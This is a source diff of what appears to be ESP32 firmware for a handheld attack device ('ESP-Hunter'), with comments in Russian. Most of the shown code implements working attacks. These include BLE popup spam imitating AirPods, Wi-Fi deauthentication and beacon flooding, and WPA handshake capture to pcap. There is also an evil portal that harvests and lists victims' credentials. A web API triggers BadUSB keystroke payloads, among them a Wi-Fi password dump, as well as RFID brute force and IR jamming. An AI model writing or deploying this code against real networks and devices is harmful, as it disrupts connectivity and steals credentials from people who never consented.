+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+
+  // 2. Инициализируем BLE с именем "AirPods Pro" (или любым другим)
+  BLEDevice::init("AirPods Pro");
+  BLEServer *pServer = BLEDevice::createServer();
+  BLEAdvertising *pAdvertising = pServer->getAdvertising();
+
+  // 3. Создаем массив с рекламными данными (включает имя устройства)
+  // Эти данные имитируют реальный пакет AirPods
+  uint8_t packetData[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x13, 0x04, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00
+  };
+
+  BLEAdvertisementData advData;
+  advData.addData(String((char*)packetData, sizeof(packetData)));
+
+  // 4. Настраиваем рекламу на постоянную отправку
+  pAdvertising->setAdvertisementData(advData);
+  pAdvertising->start();
+
+  // 5. Цикл атаки (пока не нажата ESC)
+  unsigned long lastMacChange = millis();
+  uint8_t counter = 0;
+  
+  while (digitalRead(BTN_ESC) == HIGH) {
+    // Меняем MAC-адрес каждые 300 мс, чтобы создавать иллюзию "новых" устройств
+    if (millis() - lastMacChange > 300) {
+      lastMacChange = millis();
+      counter++;
+      // Генерируем случайный MAC для видимости нового устройства
+      uint8_t randomMac[6];
+      for (int i = 0; i < 6; i++) randomMac[i] = random(0, 255); updateBuzzer();
+      randomMac[0] = (randomMac[0] & 0xFE) | 0x02; // Устанавливаем локально администрируемый бит
+      
+      pAdvertising->setScanResponseData(advData);
+      pAdvertising->stop();
+      pAdvertising->start();
+      
+      // Меняем имя (например, чередуем AirPods, AirPods Pro, AirPods Max)
+      String deviceName = "AirPods";
+      if (counter % 3 == 1) deviceName = "AirPods Pro";
+      else if (counter % 3 == 2) deviceName = "AirPods Max";
+      pServer->getAdvertising()->setScanResponseData(advData);
+    }
+    
+    // Не даем сторожевому таймеру убить прошивку
+    updateBuzzer();
+    esp_task_wdt_reset();
+    yield();
+    delay(10);
+  }
+
+  // 6. Останавливаем BLE после завершения атаки
+  BLEDevice::deinit(true);
+  
+  // 7. Восстанавливаем Wi-Fi (если нужно)
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  
+  showPopup("Sour Apple BLE stopped");
+}
+
+void drawWiFiSettingsPage() {
+  drawHeaderBar("WIFI ATTACK SETTINGS");
+  const char* labels[] = {"Frames/Deauth", "Deauth Delay", "Frames/Beacon", "Max Clone", "Max Spaces"};
+  int values[] = {framesPerDeauth, sendDelay, framesPerBeacon, maxClone, maxSpamSpace};
+  const int count = 5;
+  for (int i = 0; i < count; i++) {
+    int y = 25 + i * 18;
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.setCursor(5, y);
+    canvas.print(labels[i]);
+    canvas.setCursor(100, y);
+    if (wifiSettingsSelected == i && wifiEditValue) {
+      canvas.setTextColor(accentColor);
+      canvas.print(values[i]);
+      canvas.drawFastHLine(100, y + 9, 20, accentColor);
+    } else {
+      canvas.print(values[i]);
+    }
+    if (wifiSettingsSelected == i && !wifiEditValue) {
+      canvas.drawRect(2, y - 2, 124, 15, accentColor);
+    }
+    updateBuzzer();
+  }
+  drawFooterBar("UP/DN:Nav OK:Edit ESC:Back");
+  canvasFlush();
+}
+
+void tickBeaconSpamTask() {
+  if (!isBeaconSpamActive) return;
+  static unsigned long lastSend = 0;
+  if (millis() - lastSend < 50) return;
+  lastSend = millis();
+  char ssid[21];
+  int len = random(6, 20);
+  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  for (int i = 0; i < len; i++) ssid[i] = chars[random(0, sizeof(chars)-1)];
+  ssid[len] = '\0';
+  uint8_t src[6];
+  wifi_random_mac(src);
+  wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid, false);
+}
+
 void runDeauthTick() {
   if (deauthActive) {
+    static unsigned long lastSend = 0;
+    if (millis() - lastSend < 20) return;
+    lastSend = millis();
     WiFi.mode(WIFI_STA);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < 4; i++) {
-      sendDeauthRawFrame(scannedNetworks[wifiSelectedIndex].bssid,
-                         scannedNetworks[wifiSelectedIndex].channel);
-      delay(5);
+      wifi_send_deauth(scannedNetworks[wifiSelectedIndex].bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+      updateBuzzer();
     }
   } else {
     esp_wifi_set_promiscuous(false);
@@ -1687,33 +2236,858 @@ void runDeauthTick() {
   }
 }
 
-void drawBleSpamPage() {
-  drawHeaderBar("BLE DEVICE SPAM");
+// ======================================================================
+// 13. ЗАХВАТ HANDSHAKE
+// ======================================================================
+void captureHandshake(int targetIdx) {
+  if (targetIdx < 0 || targetIdx >= wifiScannedCount) {
+    showPopup("Invalid target");
+    return;
+  }
+  memcpy(handshakeBSSID, scannedNetworks[targetIdx].bssid, 6);
+  int channel = scannedNetworks[targetIdx].channel;
+  
+  drawHeaderBar("HANDSHAKE CAPTURE");
   canvas.setTextColor(COLOR_WHITE);
   canvas.setCursor(5, 25);
-  canvas.print("Target: iOS Popups");
-  canvas.setCursor(5, 45);
-  if (isBleSpamActive) {
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.setTextSize(2);
-    canvas.print("ATTACK ON!");
-    canvas.setTextSize(1);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.setCursor(5, 75);
-    canvas.print("Spamming AirPods Pro");
-  } else {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setTextSize(2);
-    canvas.print("DISABLED");
-    canvas.setTextSize(1);
-    canvas.setCursor(5, 75);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.print("OK: Enable Spam BLE");
+  canvas.printf("Target: %s", scannedNetworks[targetIdx].ssid);
+  canvas.setCursor(5, 40);
+  canvas.print("Listening on channel ");
+  canvas.print(channel);
+  canvas.setCursor(5, 55);
+  canvas.print("Press ESC to abort");
+  canvasFlush();
+  
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(promiscuousRxCallback);
+  
+  handshakeCapturing = true;
+  handshakeDone = false;
+  handshakeEAPOLCount = 0;
+  handshakeFrameCount = 0;
+  handshakeStartTime = millis();
+  
+  unsigned long lastUpdate = millis();
+  while (!handshakeDone && digitalRead(BTN_ESC) == HIGH) {
+    if (millis() - lastUpdate > 1000) {
+      lastUpdate = millis();
+      canvas.fillRect(0, 70, 128, 20, COLOR_BLACK);
+      canvas.setTextColor(COLOR_CYAN);
+      canvas.setCursor(5, 72);
+      canvas.printf("EAPOL: %d frames", handshakeEAPOLCount);
+      canvasFlush();
+    }
+    if (millis() - handshakeStartTime > 5000 && handshakeEAPOLCount == 0) {
+      wifi_send_deauth(handshakeBSSID, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+      delay(10);
+    }
+    updateBuzzer();
+    yield();
+    esp_task_wdt_reset();
   }
-  drawFooterBar("OK:Toggle Spam ESC:Back");
+  
+  esp_wifi_set_promiscuous(false);
+  handshakeCapturing = false;
+  
+  if (handshakeDone) {
+    saveHandshakeToSD();
+    showPopup("Handshake captured! Saved to /handshake.pcap");
+  } else {
+    showPopup("Handshake capture aborted");
+  }
+  WiFi.mode(WIFI_OFF);
+  drawWiFiScanPage();
+}
+
+void promiscuousRxCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
+  if (!handshakeCapturing) return;
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+  uint8_t *payload = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  
+  if (len < 24) return;
+  uint8_t fc = payload[0] & 0x0C;
+  if (fc != 0x08) return;
+  uint8_t* addr1 = &payload[4];
+  uint8_t* addr2 = &payload[10];
+  bool toBSSID = (memcmp(addr1, handshakeBSSID, 6) == 0);
+  bool fromBSSID = (memcmp(addr2, handshakeBSSID, 6) == 0);
+  if (!toBSSID && !fromBSSID) return;
+  
+  if (len < 24 + 8) return;
+  if (payload[24] != 0x88 || payload[25] != 0x8E) return;
+  
+  int copyLen = (len - 24 < 256) ? len - 24 : 256;
+  memcpy(handshakeEAPOL[handshakeEAPOLCount % 4], payload + 24, copyLen);
+  handshakeEAPOLCount++;
+  if (handshakeEAPOLCount >= 4) {
+    handshakeDone = true;
+    handshakeCapturing = false;
+  }
+}
+
+void saveHandshakeToSD() {
+  if (!isSdCardAvailable) return;
+  digitalWrite(TFT_CS, HIGH);
+  digitalWrite(SD_CS, LOW);
+  File pcap = SD.open("/handshake.pcap", FILE_WRITE);
+  if (!pcap) {
+    digitalWrite(SD_CS, HIGH);
+    return;
+  }
+  uint32_t magic = 0xA1B2C3D4;
+  uint16_t version_major = 2;
+  uint16_t version_minor = 4;
+  int32_t timezone = 0;
+  uint32_t sigfigs = 0;
+  uint32_t snaplen = 65535;
+  uint32_t network = 105;
+  pcap.write((uint8_t*)&magic, 4);
+  pcap.write((uint8_t*)&version_major, 2);
+  pcap.write((uint8_t*)&version_minor, 2);
+  pcap.write((uint8_t*)&timezone, 4);
+  pcap.write((uint8_t*)&sigfigs, 4);
+  pcap.write((uint8_t*)&snaplen, 4);
+  pcap.write((uint8_t*)&network, 4);
+  
+  for (int i = 0; i < handshakeEAPOLCount && i < 4; i++) {
+    uint32_t ts_sec = (uint32_t)(millis() / 1000);
+    uint32_t ts_usec = (uint32_t)((millis() % 1000) * 1000);
+    uint32_t incl_len = 256;
+    uint32_t orig_len = incl_len;
+    pcap.write((uint8_t*)&ts_sec, 4);
+    pcap.write((uint8_t*)&ts_usec, 4);
+    pcap.write((uint8_t*)&incl_len, 4);
+    pcap.write((uint8_t*)&orig_len, 4);
+    pcap.write(handshakeEAPOL[i], incl_len);
+    updateBuzzer();
+  }
+  pcap.close();
+  digitalWrite(SD_CS, HIGH);
+}
+void capturedpasswords() {
+  drawHeaderBar("EVIL PORTAL PASSWORDS");
+  if (capturedCredCount == 0) {
+    canvas.setTextColor(COLOR_RED);
+    canvas.setCursor(5, 45);
+    canvas.print("No credentials saved");
+    drawFooterBar("ESC: Back");
+    canvasFlush();
+    return;
+  }
+  if (capturedSelectedIndex < 0) capturedSelectedIndex = 0;
+  if (capturedSelectedIndex >= capturedCredCount) capturedSelectedIndex = capturedCredCount - 1;
+  if (capturedSelectedIndex < capturedScrollOffset) capturedScrollOffset = capturedSelectedIndex;
+  if (capturedSelectedIndex >= capturedScrollOffset + MAX_VISIBLE_ITEMS) {
+    capturedScrollOffset = capturedSelectedIndex - MAX_VISIBLE_ITEMS + 1;
+  }
+  if (capturedScrollOffset < 0) capturedScrollOffset = 0;
+  if (capturedScrollOffset > capturedCredCount - MAX_VISIBLE_ITEMS) {
+    capturedScrollOffset = capturedCredCount - MAX_VISIBLE_ITEMS;
+  }
+  if (millis() - marqueeTimer > 200) {
+    marqueeTimer = millis();
+    marqueeOffset++;
+  }
+  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
+    int idx = i + capturedScrollOffset;
+    if (idx >= capturedCredCount) break;
+    int lineY = 25 + i * 20;
+    String fullLine = capturedCredLines[idx];
+    if (idx == capturedSelectedIndex) {
+      canvas.fillRoundRect(2, lineY - 3, 124, 17, 3, accentColor);
+      canvas.setTextColor(COLOR_BLACK);
+      canvas.setCursor(4, lineY);
+      canvas.print("> ");
+      if (fullLine.length() * 6 > 100) {
+        int shift = marqueeOffset % (fullLine.length() + 3);
+        String subText = fullLine.substring(shift) + "   " + fullLine.substring(0, shift);
+        canvas.print(subText.substring(0, 16));
+      } else {
+        canvas.print(fullLine);
+      }
+    } else {
+      canvas.setTextColor(COLOR_WHITE);
+      canvas.setCursor(4, lineY);
+      canvas.print("  ");
+      String displayLine = fullLine;
+      if (displayLine.length() > 18) displayLine = displayLine.substring(0, 18) + "...";
+      canvas.print(displayLine);
+    }
+    updateBuzzer();
+  }
+  if (capturedCredCount > MAX_VISIBLE_ITEMS) {
+    int barHeight = 85 / capturedCredCount;
+    int barY = 25 + (capturedScrollOffset * 85) / capturedCredCount;
+    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
+    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
+  }
+  drawFooterBar("UP/DN:Scroll  OK:Copy?");
   canvasFlush();
 }
 
+// ======================================================================
+// 18. ВЕБ-СЕРВЕР (УПРАВЛЕНИЕ МЫШЬЮ, БЕЗ ЯРКОСТИ)
+// ======================================================================
+void setupWebServerRoutes() {
+  webServer.on("/", HTTP_GET, []() {
+    webServer.send(200, "text/html", HTML_DASHBOARD);
+  });
+
+  webServer.on("/api/hid/notepad", HTTP_GET, []() {
+    runBadUsbDemoNotepad();
+    webServer.send(200, "application/json", "{\"msg\":\"Win+R Notepad выполнен!\"}");
+  });
+  webServer.on("/api/hid/payload", HTTP_GET, []() {
+    executeDuckyScriptFromSd();
+    webServer.send(200, "application/json", "{\"msg\":\"Скрипт /payload.txt выполнен!\"}");
+  });
+  webServer.on("/api/hid/type", HTTP_GET, []() {
+    if (webServer.hasArg("text")) {
+      String t = webServer.arg("text");
+      runBadUsbCustomString(t);
+      webServer.send(200, "application/json", "{\"msg\":\"Текст напечатан!\"}");
+    } else {
+      webServer.send(200, "application/json", "{\"msg\":\"Ошибка: Нет текста\"}");
+    }
+  });
+
+  webServer.on("/api/badusb/shutdown", HTTP_GET, []() {
+    runBadUsbShutdown();
+    webServer.send(200, "application/json", "{\"msg\":\"Shutdown executed\"}");
+  });
+  webServer.on("/api/badusb/wallpaper", HTTP_GET, []() {
+    runBadUsbWallpaper();
+    webServer.send(200, "application/json", "{\"msg\":\"Wallpaper changed\"}");
+  });
+  webServer.on("/api/badusb/disableicons", HTTP_GET, []() {
+    runBadUsbDisableIcons();
+    webServer.send(200, "application/json", "{\"msg\":\"Icons disabled\"}");
+  });
+  webServer.on("/api/badusb/dumpwifi", HTTP_GET, []() {
+    runBadUsbDumpWifi();
+    webServer.send(200, "application/json", "{\"msg\":\"Wi-Fi passwords dumped\"}");
+  });
+
+  webServer.on("/api/portal/start", HTTP_GET, []() {
+    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal запущен на дисплее!\"}");
+    startEvilPortalService();
+  });
+  webServer.on("/api/portal/stop", HTTP_GET, []() {
+    isEvilPortalRunning = false;
+    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal остановлен\"}");
+  });
+  webServer.on("/api/portal/creds", HTTP_GET, []() {
+    String json = "{\"count\":" + String(capturedCredsCount) + ",\"last\":\"" + lastCapturedCred + "\"}";
+    webServer.send(200, "application/json", json);
+  });
+  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
+    String json = "[";
+    if (isSdCardAvailable) {
+      digitalWrite(TFT_CS, HIGH);
+      digitalWrite(SD_CS, LOW);
+      File logFile = SD.open("/captured_creds.txt", FILE_READ);
+      if (logFile) {
+        bool first = true;
+        while (logFile.available()) {
+          String line = logFile.readStringUntil('\n');
+          line.trim();
+          if (line.length() > 0) {
+            if (!first) json += ",";
+            first = false;
+            json += "\"" + line + "\"";
+          }
+        }
+        logFile.close();
+      }
+      digitalWrite(SD_CS, HIGH);
+    }
+    json += "]";
+    webServer.send(200, "application/json", json);
+  });
+
+  webServer.on("/api/rfid/scan", HTTP_GET, []() {
+    executeRfidTagScan();
+    String json = "{\"msg\":\"Метка прочитана!\", \"uid\":\"" + String(activeRfidUidHex) + "\"}";
+    webServer.send(200, "application/json", json);
+  });
+  webServer.on("/api/rfid/emulate", HTTP_GET, []() {
+    webServer.send(200, "application/json", "{\"msg\":\"Эмуляция запущенa! Нажмите ESC на плате для выхода.\"}");
+    emulateActiveRfidUid();
+  });
+  webServer.on("/api/rfid/erase", HTTP_GET, []() {
+    eraseDataOnCustomBlock();
+    webServer.send(200, "application/json", "{\"msg\":\"Блок очищен (0x00)\"}");
+  });
+  webServer.on("/api/rfid/bruteforce/start", HTTP_GET, []() {
+    bruteForceRfid();
+    webServer.send(200, "application/json", "{\"msg\":\"Bruteforce started\"}");
+  });
+
+  webServer.on("/api/ir/tvbgone", HTTP_GET, []() {
+    webServer.send(200, "application/json", "{\"msg\":\"Запущена пачка TV-B-Gone (100 кодов)!\"}");
+    runClassicTvBGoneLoop();
+  });
+  webServer.on("/api/ir/get", HTTP_GET, []() {
+    String irData = activeIrSignal.valid ?
+      ("Proto: " + typeToString(activeIrSignal.type) + " | Val: 0x" + String((uint32_t)activeIrSignal.value, HEX)) :
+      "IR RAM: Empty";
+    String json = "{\"msg\":\"Данные получены\", \"ir\":\"" + irData + "\"}";
+    webServer.send(200, "application/json", json);
+  });
+  webServer.on("/api/ir/jammer/start", HTTP_GET, []() {
+    runIrJammer();
+    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer started\"}");
+  });
+  webServer.on("/api/ir/jammer/stop", HTTP_GET, []() {
+    irJammerActive = false;
+    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer stopped\"}");
+  });
+  webServer.on("/api/ir/saved/list", HTTP_GET, []() {
+    String json = "[";
+    if (isSdCardAvailable) {
+      digitalWrite(TFT_CS, HIGH);
+      digitalWrite(SD_CS, LOW);
+      File file = SD.open("/ir_saved.txt", FILE_READ);
+      if (file) {
+        bool first = true;
+        while (file.available()) {
+          String line = file.readStringUntil('\n');
+          line.trim();
+          if (line.length() > 0) {
+            if (!first) json += ",";
+            first = false;
+            json += "\"" + line + "\"";
+          }
+        }
+        file.close();
+      }
+      digitalWrite(SD_CS, HIGH);
+    }
+    json += "]";
+    webServer.send(200, "application/json", json);
+  });
+  webServer.on("/api/ir/saved/send", HTTP_GET, []() {
+    if (webServer.hasArg("index")) {
+      int idx = webServer.arg("index").toInt();
+      sendIrSavedSignal(idx);
+      webServer.send(200, "application/json", "{\"msg\":\"Signal sent\"}");
+    } else {
+      webServer.send(200, "application/json", "{\"msg\":\"Missing index\"}");
+    }
+  });
+
+  webServer.on("/api/wifi/scan", HTTP_GET, []() {
+    WiFi.mode(WIFI_AP_STA);
+    int16_t n = WiFi.scanNetworks(false, false, false, 200);
+    String json = "[";
+    for (int i = 0; i < n; i++) {
+      if (i > 0) json += ",";
+      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
+      if (i >= 10) break;
+    }
+    json += "]";
+    WiFi.scanDelete();
+    webServer.send(200, "application/json", json);
+  });
+  webServer.on("/api/wifi/wardrive", HTTP_GET, []() {
+    executeSdWardrivingLog();
+    webServer.send(200, "application/json", "{\"msg\":\"Wardrive сохранён в /wardrive.csv!\"}");
+  });
+  webServer.on("/api/wifi/beacon/start", HTTP_GET, []() {
+    if (!isBeaconSpamActive) {
+      isBeaconSpamActive = true;
+      WiFi.mode(WIFI_AP);
+      WiFi.softAP("AP Flood Active");
+    }
+    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam started\"}");
+  });
+  webServer.on("/api/wifi/beacon/stop", HTTP_GET, []() {
+    isBeaconSpamActive = false;
+    WiFi.mode(WIFI_OFF);
+    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam stopped\"}");
+  });
+  webServer.on("/api/wifi/deauth/start", HTTP_GET, []() {
+    if (wifiScannedCount == 0) {
+      webServer.send(200, "application/json", "{\"msg\":\"No networks scanned!\"}");
+      return;
+    }
+    deauthActive = true;
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
+    webServer.send(200, "application/json", "{\"msg\":\"Deauth started\"}");
+  });
+  webServer.on("/api/wifi/deauth/stop", HTTP_GET, []() {
+    deauthActive = false;
+    esp_wifi_set_promiscuous(false);
+    WiFi.mode(WIFI_OFF);
+    webServer.send(200, "application/json", "{\"msg\":\"Deauth stopped\"}");
+  });
+
+  webServer.on("/api/ble/spam/start", HTTP_GET, []() {
+    if (!isBleSpamActive) {
+      isBleSpamActive = true;
+      startBleSpamAttack();
+    }
+    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam started\"}");
+  });
+  webServer.on("/api/ble/spam/stop", HTTP_GET, []() {
+    if (isBleSpamActive) {
+      isBleSpamActive = false;
+      stopBleSpamAttack();
+    }
+    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam stopped\"}");
+  });
+  webServer.on("/api/ble/scan", HTTP_GET, []() {
+    runBleSnifferScan();
+    String json = "[";
+    for (int i = 0; i < bleScannedCount; i++) {
+      if (i > 0) json += ",";
+      json += "{\"name\":\"" + String(bleScannedList[i].deviceName) + "\",\"mac\":\"" + String(bleScannedList[i].macAddress) + "\",\"rssi\":" + String(bleScannedList[i].signalRssi) + "}";
+    }
+    json += "]";
+    webServer.send(200, "application/json", json);
+  });
+
+  // ========== УПРАВЛЕНИЕ МЫШЬЮ ==========
+  webServer.on("/api/mouse/move", HTTP_GET, []() {
+    int x = webServer.hasArg("x") ? webServer.arg("x").toInt() : 0;
+    int y = webServer.hasArg("y") ? webServer.arg("y").toInt() : 0;
+    if (x != 0 || y != 0) {
+      Mouse.move(x, y);
+    }
+    webServer.send(200, "application/json", "{\"msg\":\"Move " + String(x) + "," + String(y) + "\"}");
+  });
+  webServer.on("/api/mouse/click", HTTP_GET, []() {
+    int btn = webServer.hasArg("button") ? webServer.arg("button").toInt() : 1;
+    if (btn == 1) { Mouse.click(MOUSE_LEFT); }
+    else if (btn == 2) { Mouse.click(MOUSE_MIDDLE); }
+    else if (btn == 3) { Mouse.click(MOUSE_RIGHT); }
+    webServer.send(200, "application/json", "{\"msg\":\"Click button " + String(btn) + "\"}");
+  });
+  webServer.on("/api/mouse/scroll", HTTP_GET, []() {
+    int delta = webServer.hasArg("delta") ? webServer.arg("delta").toInt() : 0;
+    if (delta != 0) {
+      Mouse.move(0, 0, delta);
+    }
+    webServer.send(200, "application/json", "{\"msg\":\"Scroll delta " + String(delta) + "\"}");
+  });
+
+    // ========== ДИСПЛЕЙ ==========
+  webServer.on("/api/display/rotation", HTTP_GET, []() {
+    if (webServer.hasArg("val")) {
+      uint8_t rot = webServer.arg("val").toInt() % 4;
+      currentRotation = rot;
+      applyRotation(rot);
+      saveSystemSettings();
+      webServer.send(200, "application/json", "{\"msg\":\"Rotation set to " + String(rot) + "\"}");
+    } else {
+      webServer.send(200, "application/json", "{\"msg\":\"Missing parameter\"}");
+    }
+  });
+
+  webServer.on("/api/display/brightness", HTTP_GET, []() {
+    if (webServer.hasArg("val")) {
+      uint8_t val = webServer.arg("val").toInt();
+      if (val > 255) val = 255;
+      setBacklight(val);
+      saveSystemSettings();
+      webServer.send(200, "application/json", "{\"msg\":\"Brightness set to " + String(val) + "\"}");
+    } else {
+      webServer.send(200, "application/json", "{\"msg\":\"Missing parameter\"}");
+    }
+  });
+
+  // ========== СИСТЕМА ==========
+  webServer.on("/api/system/info", HTTP_GET, []() {
+    String json = "{";
+    json += "\"board\":\"ESP32-S3\",";
+    json += "\"sd\":\"" + String(isSdCardAvailable ? "OK" : "NO") + "\",";
+    json += "\"rfid\":\"" + String(isRfidAvailable ? "OK" : "NO") + "\",";
+    json += "\"ir\":\"" + String(activeIrSignal.valid ? "Signal" : "Empty") + "\",";
+    json += "\"heap\":" + String(ESP.getFreeHeap());
+    json += "}";
+    webServer.send(200, "application/json", json);
+  });
+
+  // ========== SD КАРТА ==========
+  webServer.on("/api/sd/info", HTTP_GET, []() {
+    if (!isSdCardAvailable) {
+      webServer.send(200, "application/json", "{\"msg\":\"SD Card not mounted\"}");
+      return;
+    }
+    uint64_t total = SD.cardSize() / (1024 * 1024);
+    String msg = "SD Card: " + String(total) + " MB";
+    webServer.send(200, "application/json", "{\"msg\":\"" + msg + "\"}");
+  });
+
+  webServer.on("/api/sd/list", HTTP_GET, []() {
+    if (!isSdCardAvailable) {
+      webServer.send(200, "application/json", "{\"msg\":\"SD Card not mounted\"}");
+      return;
+    }
+    digitalWrite(TFT_CS, HIGH);
+    digitalWrite(SD_CS, LOW);
+    File root = SD.open("/");
+    String list = "Files:\n";
+    if (root) {
+      File file = root.openNextFile();
+      while (file) {
+        list += String(file.name()) + " (" + String(file.size()) + " B)\n";
+        file = root.openNextFile();
+      }
+      root.close();
+    }
+    digitalWrite(SD_CS, HIGH);
+    webServer.send(200, "application/json", "{\"msg\":\"" + list + "\"}");
+  });
+
+  // ========== О ПРОГРАММЕ ==========
+  webServer.on("/api/about", HTTP_GET, []() {
+    webServer.send(200, "application/json",
+      "{\"msg\":\"ESP-Hunter v2.0\\nBoard: ESP32-S3\\nLCD: ST7735 128x128\\nRFID: PN532\\nIR: TX/RX\\nSD: "
+      + String(isSdCardAvailable ? "OK" : "NO") + "\\nUSB: HID Keyboard+Mouse\"}");
+  });
+
+  // ========== УПРАВЛЕНИЕ ИГРОЙ PONG (через веб) ==========
+  webServer.on("/api/pong/up", HTTP_GET, []() {
+    // Симулируем нажатие кнопки UP для игры
+    btnUp.pressedEvent = true;
+    webServer.send(200, "application/json", "{\"msg\":\"Pong Up\"}");
+  });
+  webServer.on("/api/pong/down", HTTP_GET, []() {
+    btnDown.pressedEvent = true;
+    webServer.send(200, "application/json", "{\"msg\":\"Pong Down\"}");
+  });
+  webServer.on("/api/pong/reset", HTTP_GET, []() {
+    resetPongGameState();
+    webServer.send(200, "application/json", "{\"msg\":\"Pong Reset\"}");
+  });
+
+    webServer.on("/api/system/buzzer", HTTP_GET, []() {
+    if (webServer.hasArg("val")) {
+      buzzerEnabled = webServer.arg("val") == "1";
+      saveSystemSettings();
+    }
+    String json = "{\"buzzer\":" + String(buzzerEnabled ? "true" : "false") + "}";
+    webServer.send(200, "application/json", json);
+  });
+
+  // ========== WEB REMOTE СТАТУС ==========
+  webServer.on("/api/web/status", HTTP_GET, []() {
+    webServer.send(200, "application/json", "{\"msg\":\"Web Remote active, uptime: " + String(millis()/1000) + "s\"}");
+  });
+
+  webServer.onNotFound([]() {
+    webServer.send(404, "text/plain", "Not Found");
+  });
+}
+
+void runWebServerMode() {
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(AP_SSID, AP_PASS);
+  setupWebServerRoutes();
+  webServer.begin();
+  isWebServerRunning = true;
+  drawHeaderBar("WEB REMOTE CONTROL");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.print("Wi-Fi AP Active!");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 42);
+  canvas.printf("SSID: %s", AP_SSID);
+  canvas.setCursor(5, 57);
+  canvas.printf("PASS: %s", AP_PASS);
+  canvas.setTextColor(COLOR_YELLOW);
+  canvas.setCursor(5, 75);
+  canvas.print("Open in Browser:");
+  canvas.setTextColor(COLOR_CYAN);
+  canvas.setCursor(5, 90);
+  canvas.print("http://192.168.4.1");
+  drawFooterBar("Hold ESC to Exit");
+  canvasFlush();
+  while (isWebServerRunning) {
+    webServer.handleClient();
+    processIrRxTask();
+    if (digitalRead(BTN_ESC) == LOW) {
+      delay(100);
+      if (digitalRead(BTN_ESC) == LOW) {
+        isWebServerRunning = false;
+      }
+    }
+    updateBuzzer();
+    yield();
+  }
+  webServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_OFF);
+  drawHeaderBar("WEB REMOTE");
+  canvas.setTextColor(COLOR_RED);
+  canvas.setCursor(5, 50);
+  canvas.print("Server Stopped!");
+  canvasFlush();
+  delay(800);
+}
+
+// ======================================================================
+// EVIL PORTAL ФУНКЦИИ (недостающие)
+// ======================================================================
+
+void drawPortalSsidSelectPage() {
+  drawHeaderBar("CHOOSE TARGET SSID");
+  if (wifiScannedCount == 0) {
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.setCursor(5, 45);
+    canvas.print("Scanning networks...");
+    canvasFlush();
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(100);
+    wifiScannedCount = WiFi.scanNetworks(false, false, false, 200);
+    if (wifiScannedCount > 10) wifiScannedCount = 10;
+  }
+  if (portalSsidIndex >= wifiScannedCount && wifiScannedCount > 0) portalSsidIndex = 0;
+  for (int i = 0; i < 4; i++) {
+    int idx = i + evilPortalSubMenuScrollOffset;
+    if (idx >= wifiScannedCount) break;
+    int lineY = 25 + i * 20;
+    if (idx == portalSsidIndex) {
+      canvas.fillRoundRect(3, lineY - 3, 122, 17, 3, accentColor);
+      canvas.setTextColor(COLOR_BLACK);
+    } else {
+      canvas.setTextColor(COLOR_WHITE);
+    }
+    canvas.setCursor(5, lineY);
+    canvas.print(WiFi.SSID(idx).substring(0, 16));
+    updateBuzzer();
+  }
+  if (wifiScannedCount == 0) {
+    canvas.setTextColor(COLOR_RED);
+    canvas.setCursor(5, 45);
+    canvas.print("No Wi-Fi found!");
+  }
+  drawFooterBar("UP/DN:Nav OK:Select");
+  canvasFlush();
+}
+
+void drawEvilPortalPage() {
+  drawHeaderBar("EVIL PORTAL AP");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 25);
+  if (isEvilPortalRunning) {
+    canvas.setTextColor(COLOR_RED);
+    canvas.print("PORTAL: RUNNING");
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.setCursor(5, 42);
+    canvas.printf("SSID: %s", evilPortalSsid);
+    canvas.setTextColor(COLOR_CYAN);
+    canvas.setCursor(5, 60);
+    canvas.printf("Captured: %d creds", capturedCredsCount);
